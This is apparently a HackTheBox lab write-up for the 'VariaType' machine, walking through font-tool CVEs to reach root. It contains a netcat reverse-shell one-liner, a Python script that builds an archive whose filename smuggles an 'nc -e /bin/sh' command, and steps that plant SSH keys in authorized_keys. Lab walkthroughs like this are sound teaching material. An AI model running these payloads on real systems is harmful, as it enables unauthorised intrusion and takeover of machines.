# VariaType — HackTheBox Writeup
**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.129.xx.xx

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Subdomain Enumeration](#subdomain-enumeration)
3. [Directory Enumeration & Git Dumping](#directory-enumeration--git-dumping)
4. [Initial Access — CVE-2025-66034 (FontTools RCE)](#initial-access--cve-2025-66034-fonttools-rce)
5. [Lateral Movement — CVE-2024-25082 (FontForge Command Injection)](#lateral-movement--cve-2024-25082-fontforge-command-injection)
6. [Privilege Escalation — CVE-2025-47273 (setuptools Path Traversal)](#privilege-escalation--cve-2025-47273-setuptools-path-traversal)
7. [Flags](#flags)

---

## Reconnaissance

Starting with a standard Nmap service scan:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 9.2p1 Debian |
| 80/tcp | open | http | nginx 1.22.1 |

The HTTP server redirects to `http://variatype.htb/`. Add the domain to `/etc/hosts`:

```bash
echo "10.129.xx.xx  variatype.htb" >> /etc/hosts
```

The web application allows uploading `.designspace` and `.ttf`/`.otf` font files.

---

## Subdomain Enumeration

Enumerate virtual hosts with `ffuf`:

```bash
ffuf -u http://variatype.htb/ \
     -H "Host: FUZZ.variatype.htb" \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fc 301
```

**Found:**

```
portal  [Status: 200, Size: 2494]
```

Add the subdomain to `/etc/hosts`:

```
10.129.xx.xx  variatype.htb portal.variatype.htb
```

Navigating to `http://portal.variatype.htb` presents a login form requiring credentials.

---

## Directory Enumeration & Git Dumping

Run `gobuster` against the portal to discover endpoints:

```bash
gobuster dir -u http://portal.variatype.htb \
             -w /usr/share/wordlists/dirb/common.txt \
             -x php
```

**Notable findings:**

| Path | Status |
|------|--------|
| `.git/HEAD` | 200 |
| `auth.php` | 200 |
| `dashboard.php` | 302 |
| `index.php` | 200 |
| `files/` | 301 |

The exposed `.git` directory is a critical finding. Dump the repository using `git-dumper`:

```bash
python3 git_dumper.py http://portal.variatype.htb/.git variatype
```

### Reviewing Git History

```bash
cd variatype
git log
```

Two commits are found:

```
753b5f59  fix: add gitbot user for automated validation pipeline
5030e791  feat: initial portal implementation
```

Checkout the latest commit:

```bash
git checkout 753b5f5957f2020480a19bf29a0ebc80267a4a3d
```

Inspect `auth.php`:

```php
<?php
session_start();
$USERS = [
    'gitbot' => '[REDACTED]'
];
```

A hardcoded credential is found for the `gitbot` user. Use it to log in to `http://portal.variatype.htb`.

---

## Initial Access — CVE-2025-66034 (FontTools RCE)

After logging in, the portal accepts `.designspace` and font file uploads. This version of FontTools is vulnerable to **CVE-2025-66034**, a remote code execution vulnerability.

**Reference:** https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv

Use the public PoC to automate exploitation:

```bash
python3 exploit.py
```

```
[*] Building TTFs...
[+] Built  light=656b  regular=656b
[*] Trying: ../../../var/www/portal.variatype.htb/public/shell.php
[*] HTTP 200
[+] SHELL: http://portal.variatype.htb/shell.php
[+] Interactive shell ready
[+] URL: http://portal.variatype.htb/shell.php?c=<cmd>
```

Execution is confirmed as `www-data`. Upgrade to a proper reverse shell. Start a listener:

```bash
penelope -p 4444
```

Trigger the reverse shell via the webshell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.xx.xx 4444 >/tmp/f
```

A PTY shell is received as `www-data`.

---

## Lateral Movement — CVE-2024-25082 (FontForge Command Injection)

### Process Discovery

Monitoring running processes (e.g. with `pspy`) reveals a cron job running as `steve` (UID=1000):

```
/bin/bash /home/steve/bin/process_client_submissions.sh
```

This script invokes `fontforge` to process uploaded font files:

```python
/usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
font = fontforge.open('uploaded_file.ttf')
```

### Exploiting CVE-2024-25082

FontForge through 20230101 is vulnerable to **command injection via crafted archive filenames** when extracting compressed files.

Craft a malicious `.tar.gz` archive with a filename that embeds a shell command:

```python
# exploit.py
import tarfile, io

rev = "\$(nc${IFS}-e${IFS}/bin/sh${IFS}10.10.xx.xx${IFS}4446).ttf"
hello = b"hello"

with tarfile.open("/tmp/fontpack.tar.gz", "w:gz") as tar:
    info = tarfile.TarInfo(name=rev)
    info.size = len(hello)
    tar.addfile(info, io.BytesIO(hello))

print("[+] Created fontpack.tar.gz")
```

```bash
python3 exploit.py
cp /tmp/fontpack.tar.gz /var/www/portal.variatype.htb/public/files/
```

Start a second listener:

```bash
penelope -p 4446
```

Wait approximately 2 minutes for the cron job to pick up and process the file. A reverse shell is received as `steve`.

```bash
steve@variatype:/tmp/ffarchive-14700-1$ id
uid=1000(steve) gid=1000(steve) groups=1000(steve)
```

Grab the user flag:

```bash
cat ~/user.txt
# [REDACTED]
```

### Stabilising Access

The reverse shell session was unstable. Add your public SSH key to `steve`'s `authorized_keys` for a persistent session:

```bash
echo "ssh-rsa AAAA..." >> /home/steve/.ssh/authorized_keys
ssh -i id_rsa steve@10.129.xx.xx
```

---

## Privilege Escalation — CVE-2025-47273 (setuptools Path Traversal)

### Sudo Enumeration

```bash
sudo -l
```

```
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### Reviewing the Script

```bash
cat /opt/font-tools/install_validator.py
```

The script accepts a plugin URL and uses `setuptools.package_index.PackageIndex` to download and install it:

```python
from setuptools.package_index import PackageIndex

def install_validator_plugin(plugin_url):
    index = PackageIndex()
    downloaded_path = index.download(plugin_url, PLUGIN_DIR)
```

`PLUGIN_DIR` is hardcoded to `/opt/font-tools/validators`. By default, files are saved there — but the `PackageIndex.download()` method is vulnerable to **CVE-2025-47273**, a path traversal bug where a URL-encoded path in the filename portion of a URL causes the file to be written outside the target directory.

### Exploitation

**Goal:** Write our SSH public key to `/root/.ssh/authorized_keys`.

Serve the public key over HTTP on the attack machine:

```bash
python3 -m http.server 80
# Ensure id_rsa.pub is accessible at /root/.ssh/authorized_keys path
```

A naive attempt saves the file to the plugin directory:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.xx.xx/root/.ssh/authorized_keys"
# Plugin installed at: /opt/font-tools/validators/authorized_keys  ← Wrong location
```

Use URL-encoded path separators (`%2F`) to trigger path traversal and write directly to `/root/.ssh/authorized_keys`:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.xx.xx/%2Froot%2F.ssh%2Fauthorized_keys"
```

```
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

SSH in as root:

```bash
ssh -i id_rsa root@10.129.xx.xx
```

```
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| Flag | Value |
|------|-------|
| User (`/home/steve/user.txt`) | `[REDACTED]` |
| Root (`/root/root.txt`) | `[REDACTED]` |

---

## Vulnerability Summary

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2025-66034 | FontTools | RCE via malicious font file → webshell |
| CVE-2024-25082 | FontForge | Command injection via crafted archive filename |
| CVE-2025-47273 | setuptools `PackageIndex` | Path traversal → arbitrary file write as root |

---

## Attack Chain

```
Nmap → vhost enum → portal.variatype.htb
  → gobuster → exposed .git → git-dumper
  → hardcoded gitbot credentials in auth.php
  → login → CVE-2025-66034 → RCE as www-data
  → pspy → fontforge cron job as steve
  → CVE-2024-25082 → shell as steve
  → sudo install_validator.py → CVE-2025-47273
  → write SSH key to /root/.ssh/authorized_keys
  → SSH as root
```
